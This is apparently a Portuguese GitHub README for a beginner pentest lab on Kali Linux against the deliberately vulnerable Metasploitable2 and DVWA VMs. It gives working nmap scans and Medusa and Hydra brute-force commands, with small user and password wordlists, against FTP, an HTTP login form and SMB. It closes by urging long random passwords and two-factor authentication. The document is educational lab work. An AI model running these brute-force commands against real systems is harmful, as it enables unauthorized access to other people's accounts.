# security-lab

Iniciando estudo de lab em cybersecurity

Um breve exercício de invasão com ferramentas clássicas

**Ambiente seguro para demonstrar a importância de senhas aleatórias, com mais de 8 dígitos, e dos sistemas de rede atualizados**

## Montando o laboratório
### Baixar:

1. Oracle VirtualBox: https://www.virtualbox.org/

2. Kali Linux (ISP): https://www.kali.org/get-kali/#kali-installer-images

3. Metasploitable2 (Linux): https://sourceforge.net/projects/metasploitable/ 

Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be used to conduct security training, test security tools, and practice common penetration testing techniques.

### Montar o lab

1. Instalar o VirtualBox na maquina
2. Montar a VM KaliLinux pela ISO
3. Montar a VM Metasploitable (não tem ISO, deve montar a maquina virtual sem HD e depois adicionar o HD baixado)
4. Na configuração rede escolher para ambas VM "VirtualBox Host-Only Ethernet Adapter"
5. Confirmar IP em ambas VM, algo como 192.168.56.10x

### PENTEST (Penetration Test)

## Alvo via FTP:
**O FTP (File Transfer Protocol ou Protocolo de Transferência de Arquivos)** é um protocolo de rede padrão usado para enviar e receber arquivos entre um computador (cliente) e um servidor pela internet ou em redes locais.
Iremos verificar se existe alguma porta aberta típica FTP: 21,22,80,445,139

**1. Varredura de rede e enumeração**
Utilizaremos NMAP, já instalado no KALI. O Nmap é uma ferramenta de cibersegurança usada para escanear redes, identificar dispositivos conectados e verificar portas abertas em sistemas remotos.

```bash
nmap -v -sV -p 21,22,80,445,139 192.168.56.101
```
Ao identificar alguma porta FTP aberta, podemos verificar via FTP, mas não temos o id, nem o password

```bash
ftp 192.168.56.101
```
### Brute Force 
Um ataque de força bruta é uma atividade ilegal que busca obter pares de nome de usuário e senha por meio de tentativas repetidas de login, utilizando uma lista de palavras (wordlist) via rede.

**2. Criar listas de prováveis USERs e PASSWORDs**
Cada alvo tem especificidades e possibilidades de USERs e PASSWORDs, que devem ser investigados via OSINT - Open Source Intelligence

Como exemplo criaremos duas lista simples: user.txt e pass.txt

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > user.txt
echo -e '123456\npassword\nqwert\nmsfadmin' > pass.txt
```
**3. Ataque via Medusa**

Esta ferramenta já está instalado no KALI

Medusa is a modular, high-speed, parallel login brute-forcing tool primarily used by security auditors and penetration testers to identify weak credentials across network services

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6
```
## Alvo via HTTP
Para este estudo utilizaremos o **DVWA – Damn Vulnerable Web Application** que é uma ferramenta desenvolvida em PHP/MySQL, e contém diversas vulnerabilidades para a pratica de segurança http.
dvwa.co.uk



<img width="474" height="454" alt="image" src="https://github.com/user-attachments/assets/10c3be32-6d4f-4625-9d9d-502ace9294df" />

Trata-se de um website muito semelhante aos diversos formulários de login de serviços que utilizamos no dia a dia

1. Utilizaremos a mesma ferramenta **Medusa** que utilizamos anteriormente

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m'FAIL=Login failed' -t 6
```
O resultado não foi o esperado!!!

Então tentaremos com o **Hydra**
Embora o Medusa seja excelente para protocolos como SSH, Telnet e FTP, o Hydra é amplamente considerado mais robusto e flexível para formulários web (HTTP-POST-FORM), pois lida melhor com cookies e caminhos.

```bash
hydra -L user.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6
```
retornando:

<img width="550" height="138" alt="image" src="https://github.com/user-attachments/assets/f01c6781-630a-4f9a-8021-398de2135124" />

## Alvo via SMB

**Service Message Block** is a network communication protocol used for sharing files, printers, serial ports, and remote storage across computers on a local area network (LAN)

```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M smbnt -t 2 -T 50
```

<img width="545" height="128" alt="image" src="https://github.com/user-attachments/assets/0b19595d-7004-4bf7-9ce3-505171673b89" />

Com o id e password basta entrar pelo serviço...

```bash
smbclient -L //192.168.56.101 -U msfadmin
```

<img width="594" height="252" alt="image" src="https://github.com/user-attachments/assets/b3af2482-2724-47b9-8354-d085c90a00c0" />


## Conclusão: Senhas aleatórias com mais de 8 dígitos dificultaria muito essa invasão!!! 
Além de verificação em duas etapas, e toda a a infraestrutura de segurança e atualização dos sistemas





















